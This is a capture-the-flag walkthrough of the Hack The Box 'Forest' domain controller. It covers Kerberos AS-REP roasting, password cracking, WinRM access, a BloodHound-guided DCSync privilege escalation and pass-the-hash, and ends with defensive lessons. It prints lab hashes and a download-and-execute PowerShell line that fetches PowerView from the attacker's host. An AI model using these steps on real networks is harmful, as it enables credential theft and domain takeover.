# Forest Writeup w/o Metasploit

![](https://miro.medium.com/max/595/1*pcB0gCBLtndiQS1e9ZmQsQ.png)

## Reconnaissance <a id="ad59"></a>

Run the [nmapAutomato](https://github.com/rkhal101/nmapAutomator)r script to enumerate open ports and services running on those ports.

```text
nmapAutomator.sh 10.10.10.161 All
```

* **All**: Runs all the scans consecutively.

We get back the following result.

```text
Running all scans on 10.10.10.161Host is likely running Windows
---------------------Starting Nmap Quick Scan---------------------Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 21:50 EDT
Warning: 10.10.10.161 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.161
Host is up (0.092s latency).
Not shown: 940 closed ports, 49 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPsslNmap done: 1 IP address (1 host up) scanned in 13.34 seconds                                                                                                                   
                                                                                                                                                                               
                                                                                                                                                                               
                                                                                                                                                                               
---------------------Starting Nmap Basic Scan---------------------                                                                                                             
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 21:50 EDT                                                                                                                
Nmap scan report for 10.10.10.161
Host is up (0.41s latency).PORT     STATE SERVICE      VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-03-14 02:00:20Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:
|_clock-skew: mean: 2h29m28s, deviation: 4h02m30s, median: 9m27s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2020-03-13T19:02:43-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-03-14T02:02:45
|_  start_date: 2020-03-14T01:46:00Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 286.29 seconds----------------------Starting Nmap UDP Scan----------------------
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 21:55 EDT
Warning: 10.10.10.161 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.10.10.161
Host is up (0.11s latency).
Not shown: 859 open|filtered ports, 136 closed ports
PORT      STATE SERVICE
123/udp   open  ntp
389/udp   open  ldap
49202/udp open  unknown
49211/udp open  unknown
62154/udp open  unknownNmap done: 1 IP address (1 host up) scanned in 158.32 secondsMaking a script scan on UDP ports: 123, 389, 49202, 49211, 62154
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 21:58 EDT
Nmap scan report for 10.10.10.161
Host is up (0.035s latency).PORT      STATE SERVICE VERSION
123/udp   open  ntp     NTP v3
389/udp   open  ldap    Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
49202/udp open  domain  (generic dns response: SERVFAIL)
49211/udp open  domain  (generic dns response: SERVFAIL)
62154/udp open  domain  (generic dns response: SERVFAIL)

3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.13 seconds---------------------Starting Nmap Full Scan----------------------
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 21:58 EDT
Initiating Parallel DNS resolution of 1 host. at 21:58
Completed Parallel DNS resolution of 1 host. at 21:58, 0.03s elapsed
Initiating SYN Stealth Scan at 21:58
Nmap scan report for 10.10.10.161
Host is up (0.12s latency).
Not shown: 64267 closed ports, 1244 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49684/tcp open  unknown
49706/tcp open  unknown
49900/tcp open  unknownRead data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 229.59 seconds
           Raw packets sent: 87563 (3.853MB) | Rcvd: 92820 (3.862MB)Making a script scan on extra ports: 5985, 9389, 47001, 49664, 49665, 49666, 49667, 49671, 49676, 49677, 49684, 49706, 49900
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 22:02 EDT
Nmap scan report for 10.10.10.161
Host is up (0.079s latency).PORT      STATE SERVICE    VERSION
5985/tcp  open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf     .NET Message Framing
47001/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc      Microsoft Windows RPC
49665/tcp open  msrpc      Microsoft Windows RPC
49666/tcp open  msrpc      Microsoft Windows RPC
49667/tcp open  msrpc      Microsoft Windows RPC
49671/tcp open  msrpc      Microsoft Windows RPC
49676/tcp open  ncacn_http Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc      Microsoft Windows RPC
49684/tcp open  msrpc      Microsoft Windows RPC
49706/tcp open  msrpc      Microsoft Windows RPC
49900/tcp open  msrpc      Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.59 seconds---------------------Starting Nmap Vulns Scan---------------------
                                                                                                                                                                               
Running CVE scan on all ports
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-13 22:03 EDT
Nmap scan report for 10.10.10.161
Host is up (0.055s latency).PORT      STATE SERVICE      VERSION
53/tcp    open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-03-14 02:12:56Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49706/tcp open  msrpc        Microsoft Windows RPC
49900/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=3/13%Time=5E6C3B75%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 149.39 seconds
```

We have 24 ports open.

* **Ports 53, 49202, 49211 & 62154:** running DNS
* **Port 88:** running Microsoft Windows Kerberos
* **Ports 139 & 445:** running SMB
* **Ports 389 & 3268:** running Microsoft Windows Active Directory LDAP
* **Port 464:** running kpasswd5
* **Ports 593 & 49676:** running ncacn\_http
* **Ports 636 & 3269:** running tcpwrapped
* **Port 5985:** running wsman
* **Port 47001:** running winrm
* **Port 9389:** running .NET Message Framing
* **Ports 135, 49664, 49665, 49666, 49667, 49671, 49677, 49684, 49706, 49900:** running Microsoft Windows RPC
* **Port 123:** running NTP

Before we move on to enumeration, let’s make some mental notes about the scan results.

* Since the Kerberos and LDAP services are running, chances are we’re dealing with a Windows Active Directory box.
* The nmap scan leaks the domain and hostname: _htb.local_ and _FOREST.htb.local_. Similarly, the SMB OS nmap scan leaks the operating system: Windows Server 2016 Standard 14393.
* Port 389 is running LDAP. We’ll need to query it for any useful information. Same goes for SMB.
* The WSMan and WinRM services are open. If we find credentials through SMB or LDAP, we can use these services to remotely connect to the box.

## Enumeration <a id="7b0a"></a>

We’ll start off with enumerating LDAP.

**Port 389 LDAP**

Nmap has an NSE script that enumerates LDAP. If you would like to see how to do this manually, refer to the [Lightweight Writeup](https://medium.com/@ranakhalil101/hack-the-box-lightweight-writeup-w-o-metasploit-855a5fcf7b82).

```text
root@kali:~/Desktop/htb/lightweight# locate ldap-search
/usr/share/nmap/scripts/ldap-search.nse
```

Let’s run the script on port 389.

```text
root@kali:~/Desktop/htb/forest# nmap -p 389 --script ldap-search 10.10.10.161
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-14 23:27 EDT
Nmap scan report for 10.10.10.161
Host is up (0.045s latency).PORT    STATE SERVICE
389/tcp open  ldap
| ldap-search: 
|   Context: DC=htb,DC=local
|     dn: DC=htb,DC=local
|         objectClass: top
|         objectClass: domain
|         objectClass: domainDNS
|         distinguishedName: DC=htb,DC=local
|         instanceType: 5
|         whenCreated: 2019/09/18 17:45:49 UTC
|         whenChanged: 2020/03/15 01:20:29 UTC
|         subRefs: DC=ForestDnsZones,DC=htb,DC=local
|         subRefs: DC=DomainDnsZones,DC=htb,DC=local
|         subRefs: CN=Configuration,DC=htb,DC=local
|         uSNCreated: 4099
|         dSASignature: \x01\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00:\xA3k#YyAJ\xB9Y_\x82h\x9A\x08q
|         uSNChanged: 4285009
|         name: htb
|         objectGUID: dff0c71a-49a9-264b-8c7b-52e3e2cb6eab.....msExchMailboxTemplateLink: CN=ArbitrationMailbox,CN=Retention Policies Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchHideFromAddressLists: TRUE
|         msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
|         msExchMasterAccountSid: \x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00
|         msExchMailboxGuid: \xD8\x14\xC5\x13\xFC\xF4pA\x9C\xA8,\xB1\x03\xB5|\xB4
|         msExchDumpsterQuota: 31457280
|         msExchCalendarLoggingQuota: 6291456
|         msExchUMDtmfMap: emailAddress:797836624526913052927892047252322452711419621
|         msExchUMDtmfMap: lastNameFirstName:6739242777682513052927323243292203259333256342
|         msExchUMDtmfMap: firstNameLastName:6739242777682513052927323243292203259333256342
|         msExchArchiveWarnQuota: 94371840
|         msExchModerationFlags: 6
|         msExchRecipientSoftDeletedStatus: 0
|         msExchUserAccountControl: 2
|         msExchUMEnabledFlags2: -1
|         msExchMailboxFolderSet: 0
|         msExchRecipientDisplayType: 10
|         mDBUseDefaults: FALSE....
```

We get a bunch of results, which I have truncated. Notice that it does leak first names, last names and addresses which are written in [DTMF map format](https://docs.microsoft.com/en-us/exchange/voice-mail-unified-messaging/automatically-answer-and-route-calls/dtmf-interface), which maps letters to their corresponding digits on the telephone keypad. This is obviously reversible. However, before I start writing a script to convert the numbers to letters, I’m going to enumerate other ports to see if I can get names from there.

We’ll run enum4linux which is a tool for enumerating information from Windows and Samba systems. It’s a wrapper around the Samba tools smbclient, rpclient, net and nmblookup. With special configuration, you can even have it query LDAP.

```text
enum4linux 10.10.10.161 > enum4linux-results.txt
```

We get a list of domain users.

```text
[+] Getting domain group memberships:
Group 'Domain Users' (RID: 513) has member: HTB\Administrator
Group 'Domain Users' (RID: 513) has member: HTB\DefaultAccount
Group 'Domain Users' (RID: 513) has member: HTB\krbtgt
Group 'Domain Users' (RID: 513) has member: HTB\$331000-VK4ADACQNUCA
Group 'Domain Users' (RID: 513) has member: HTB\SM_2c8eef0a09b545acb
Group 'Domain Users' (RID: 513) has member: HTB\SM_ca8c2ed5bdab4dc9b
Group 'Domain Users' (RID: 513) has member: HTB\SM_75a538d3025e4db9a
Group 'Domain Users' (RID: 513) has member: HTB\SM_681f53d4942840e18
Group 'Domain Users' (RID: 513) has member: HTB\SM_1b41c9286325456bb
Group 'Domain Users' (RID: 513) has member: HTB\SM_9b69f1b9d2cc45549
Group 'Domain Users' (RID: 513) has member: HTB\SM_7c96b981967141ebb
Group 'Domain Users' (RID: 513) has member: HTB\SM_c75ee099d0a64c91b
Group 'Domain Users' (RID: 513) has member: HTB\SM_1ffab36a2f5f479cb
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailboxc3d7722
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailboxfc9daad
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailboxc0a90c9
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailbox670628e
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailbox968e74d
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailbox6ded678
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailbox83d6781
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailboxfd87238
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailboxb01ac64
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailbox7108a4e
Group 'Domain Users' (RID: 513) has member: HTB\HealthMailbox0659cc1
Group 'Domain Users' (RID: 513) has member: HTB\sebastien
Group 'Domain Users' (RID: 513) has member: HTB\lucinda
Group 'Domain Users' (RID: 513) has member: HTB\svc-alfresco
Group 'Domain Users' (RID: 513) has member: HTB\andy
Group 'Domain Users' (RID: 513) has member: HTB\mark
Group 'Domain Users' (RID: 513) has member: HTB\santi
Group 'Domain Users' (RID: 513) has member: HTB\rc
Group 'Domain Users' (RID: 513) has member: HTB\ln
```

Take the above usernames and save them in the file _usernames.txt._

```text
root@kali:~/Desktop/htb/forest# cat usernames.txt 
Administrator
DefaultAccount
krbtgt
sebastien
lucinda
svc-alfresco
andy
mark
santi
rc
ln
```

Now I have a bunch of usernames but no passwords. If Kerberos pre-authentication is disabled on any of the above accounts, we can use the [GetNPUsers](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) impacket script to send __a dummy request for authentication. The Key Distribution Center \(KDC\) will then return a TGT that is encrypted with the user’s password. From there, we can take the encrypted TGT, run it through a password cracker and brute force the user’s password.

When I first did this box, I assumed the Impacket script requires a username as a parameter and therefore ran the script on all the usernames that I found. However, it turns out that you can use the script to output both the vulnerable usernames and their corresponding encrypted TGTs.

```text
GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request
```

We get back the following result.

![](https://miro.medium.com/max/1421/1*hEVdVciXL8Uf8Or5CEqKSA.png)

The Kerberos pre-authentication option has been disabled for the user _svc-alfresco_ and the KDC gave us back a TGT encrypted with the user’s password.

Save the encrypted TGT in the file _hash.txt_.

```text
root@kali:~/Desktop/htb/forest# cat hash.txt                                                                
$krb5asrep$svc-alfresco@HTB:4ca6507622ec86fa1a1c8e6ed6c9070f$670b846a8ba6ee243b9cad85657328fdf5624df615750cf3eeaa364b04ae9225ecaff4cf8994bb71fd4c07c9d406c6c30b1a1f899bde7bb9eb4df3e83fa07fc4405994a1bbd7a9fb6105342f78e5ca1ae8797b136f1eaecebd11eefeec83062b0142081208ef51cc17cbecf1fa7a88fad24aee856a539668fb3b9eae917cb6efb57df72a533f893c715bb0216f63c6df345e66fe66777ecfe98c8b516c905d4a81c7e6a4b5d3a3779ddf1ccad98e062f9bfc40596b24bd7685892f4ce22d44dcbf9aa2594748f81e2b7cc369390fab61d8cc7e5eeb2b987e4e52c9fab5f9a184
```

Crack the password using John the Ripper.

```text
john  --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

We get back the following result showing us that it cracked the password.

```text
root@kali:~/Desktop/htb/forest# john --show hash.txt 
$krb5asrep$svc-alfresco@HTB:s3rvice1 password hash cracked, 0 left
```

## Initial Foothold <a id="8fca"></a>

Now that we have the username/password _svc-alfresco/s3rvice_, we’ll use the [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) script to gain an initial foothold on the box. This is only possible because the WinRM and WSMan services are open \(refer to nmap scan\).

```text
evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice'
```

We get a shell!

![](https://miro.medium.com/max/1110/1*z9cX5m0BZ6YETlAfQZW0HA.png)

Grab the _user.txt_ flag.

![](https://miro.medium.com/max/760/1*DiohUDdApVjdCwjQlOkuIA.png)

## Privilege Escalation <a id="ad2d"></a>

Enumerate the users on the domain.

![](https://miro.medium.com/max/984/1*63pGz3KcZ7d9RPrKJ8lxMA.png)

Enumerate the user account we’re running as.

![](https://miro.medium.com/max/929/1*qkfE3938igExB_1u7c9Eig.png)

The user is part of the _Service Accounts_ group. Let’s run bloodhound to see if there are any exploitable paths.

First, download [SharpHound.exe](https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors) and setup a python server in the directory it resides in.

```text
python -m SimpleHTTPServer 5555
```

In the target machine, download the executable.

```text
(new-object System.Net.WebClient).DownloadFile('http://10.10.14.45:5555/SharpHound.exe', 'C:\Users\svc-alfresco\Desktop\SharpHound.exe')
```

Then run the program.

```text
./Sharphound.exe
```

This outputs two files.

![](https://miro.medium.com/max/1346/1*ojhjoWq6RMjo7cAvGkbV9A.png)

We need to transfer the ZIP file to our attack machine. To do that, base64 encode the file.

```text
certutil -encode 20200321162811_BloodHound.zip test.txt
```

Then output the base64 encoded file.

```text
type test.txt
```

Copy it and base64 decode it on the attack machine.

```text
echo -n "<base64-encoded-value>" | base64 -d > bloodhound-result.zip
```

Alright, now that we how the zipped file on our attack machine, we need to upload it to BloodHound. If you don’t have BloodHound installed on your machine, use the following command to install it.

```text
apt-get install bloodhound
```

Next, we need to start up the neo4j database.

```text
neo4j console
```

Then run bloodhound.

```text
bloodhound
```

Drag and drop the zipped file into BloodHound. Then set the start node to be the _svc-alfresco_ user.

![](https://miro.medium.com/max/430/1*ZFaurDfOVvpid4vs9Eupaw.png)

Right click on the user and select “_Mark User as Owned_”.

![](https://miro.medium.com/max/478/1*qp1rgNv_-qSoQUg4Rmcdeg.png)

In the _Queries_ tab, select the pre-built query “_Shortest Path from Owned Principals_”.

![](https://miro.medium.com/max/464/1*27gUuo0gnBabPYkrJlukXw.png)

We get back the following result.

![](https://miro.medium.com/max/1329/1*U9yMLsgD9RsAicY5Is1Vsg.png)

From the above figure, we can see that _svc-alfresco_ is a member of the group _Service Accounts_ which is a member of the group _Privileged IT Accounts_, which is a member of _Account Operators_. Moreover, the _Account Operators_ group has _GenericAll_ permissions on the _Exchange Windows Permissions_ group, which has _WriteDacl_ permissions on the domain.

This was a mouthful, so let’s break it down.

* _svc-alfresco_ is not just a member of _Service Accounts_, but is also a member of the groups _Privileged IT Accounts_ and _Account Operators._
* The Account Operators group [grants limited account creation privileges to a user](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-accountoperators). Therefore, the user _svc-alfresco_ can create other users on the domain.
* The _Account Operators_ group has _GenericAll_ permission on the _Exchange Windows Permissions_ group. This permission essentially gives members full control of the group and therefore allows members to directly modify group membership. Since _svc-alfresco_ is a member of _Account Operators_, he is able to modify the permissions of the _Exchange Windows Permissions_ group.
* The _Exchange Windows Permission_ group has _WriteDacl_ permission on the domain _HTB.LOCAL_. This permission allows members to modify the DACL \(Discretionary Access Control List\) on the domain. We’ll abuse this to grant ourselves DcSync privileges, which will give us the right to perform domain replication and dump all the password hashes from the domain.

Putting all the pieces together, the following is our attack path.

1. Create a user on the domain. This is possible because _svc-alfresco_ is a member of the group _Account Operators_.
2. Add the user to the _Exchange Windows Permission_ group. This is possible because _svc-alfresco_ has _GenericAll_ permissions on the _Exchange Windows Permissions_ group.
3. Give the user DcSync privileges. This is possible because the user is a part of the _Exchange Windows Permissions_ group which has _WriteDacl_ permission on the _htb.local_ domain.
4. Perform a DcSync attack and dump the password hashes of all the users on the domain.
5. Perform a Pass the Hash attack to get access to the administrator’s account.

Alright, let’s get started.

Create a user on the domain.

```text
net user rana password /add /domain
```

Confirm that the user was created.

![](https://miro.medium.com/max/1007/1*ZrthoA1bPAz0OSp5kW4sgg.png)

Add the user to to the _Exchange Windows Permission_ group.

```text
net group "Exchange Windows Permissions" /add rana
```

Confirm that the user was added to the group.

![](https://miro.medium.com/max/870/1*-v16S627q0fJcxkP7EV-gQ.png)

Give the user DCSync privileges. We’ll use PowerView for this. First download [Powerview](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) and setup a python server in the directory it resides in.

```text
python -m SimpleHTTPServer 5555
```

Then download the script on the target machine.

```text
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.45:5555/PowerView.ps1')
```

Use the _Add-DomainObjectAcl_ function in PowerView to give the user DCSync privileges.

```text
$pass = convertto-securestring 'password' -AsPlainText -Force$cred = New-Object System.Management.Automation.PSCredential('htb\rana', $pass)Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity rana -Rights DCSync
```

On the attack machine, use the [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) Impacket script to dump the password hashes of all the users on the domain.

```text
impacket-secretsdump htb.local/rana:password@10.10.10.161
```

We get back the following result.

![](https://miro.medium.com/max/1282/1*JAQEZrr25tXnVVJB1U6TvQ.png)

Use the [psexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) Impacket script to perform a pass the hash attack with the Administrator’s hash.

```text
./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
```

We get a shell!

![](https://miro.medium.com/max/1311/1*zpRXRpDak9HjctGhr-r38g.png)

Grab the _root.txt_ flag.

![](https://miro.medium.com/max/674/1*kvYdA9aRT3jgQur8ZvcIkw.png)

## Lessons Learned <a id="45fb"></a>

To gain an initial foothold on the box we exploited three vulnerabilities.

1. SMB null session authentication. We were able to authenticate to the host without having to enter credentials. As an unauthenticated remote attacker, we leveraged this vulnerability to enumerate the list of users on the domain. Null sessions should be restricted or disabled on the server.
2. Kerberos pre-authentication disabled. After enumerating the list of users on the domain, we ran a script that checked if kerberos pre-authentication was disabled on any of the user accounts. We found that was the case for one of the service accounts. Therefore, we sent a dummy request for authentication and the KDC responded with a TGT encrypted with the user’s password. Kerberos pre-authentication should be enabled for all user accounts.
3. Weak authentication credentials. After getting a TGT encrypted with the user’s password, we passed that TGT to a password cracker and cracked the user’s password. This allowed us to authenticate as the user and gain an initial foothold on the box. The user should have used a stronger password that is difficult to crack.

To escalate privileges we exploited one vulnerability.

1. Misconfigured AD domain object permissions. After gaining an initial foothold on the box, we discovered \(using bloodhound\) that our user is a member of two groups. However, these groups were members of other groups, and those groups were members of other groups and so on \(known as nested groups\). Therefore, our user inherited the rights of the parent and grandparent groups. This allowed a low privileged user not only to create users on the domain but also allowed the user to give these users DCSync privileges. These privileges allow an attacker to simulate the behaviour of the Domain Controller \(DC\) and retrieve password hashes via domain replication. This gave us the administrator hash, which we used in a pass the hash attack to gain access to the administrator’s account. Least privilege policy should be applied when configuring permissions.

